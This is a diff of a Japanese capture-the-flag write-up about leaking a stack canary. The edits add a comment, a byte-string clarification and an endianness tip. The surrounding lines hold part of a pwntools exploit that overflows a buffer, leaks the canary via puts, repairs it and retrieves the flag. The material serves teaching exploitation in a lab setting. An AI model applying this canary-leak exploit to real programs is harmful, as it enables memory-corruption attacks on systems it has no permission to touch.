@@ -76,7 +76,7 @@ buf       ...         canary                                   ...
 0x41 0x41      ...    0x41 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x??  ... 0x00
 ```
 
-となり, `puts(buf)` で `canary` を含んだ文字列(バイト列)をリークできる.
+となり, `puts(buf)` で `canary` を含んだ文字列(バイト列(`0x??????????????41`))をリークできる.
 
 これによって得られる `canary` は下位2byteが `0x00` ではないため, これを修正して提示すればよい.
 
@@ -96,7 +96,7 @@ io.sendafter(b'Input:\n', b'A'*0xc9)
 io.recvuntil(b'A'*0xc8)
 
 # Leak canary
-canary = u64(io.recvline().strip()[:8])
+canary = u64(io.recvline().strip()[:8]) # Get 8 bytes
 log.info(f'Output: {hex(canary)}')
 
 # Modify leaked canary
@@ -109,3 +109,5 @@ io.sendafter(b'Canary?\n', p64(canary))
 flag = io.recvregex(b'Alpaca{.+}').decode()
 print(f'[+] {flag}')
 ```
+
+- バイト列のやり取りの際, エンディアンに気をつける.
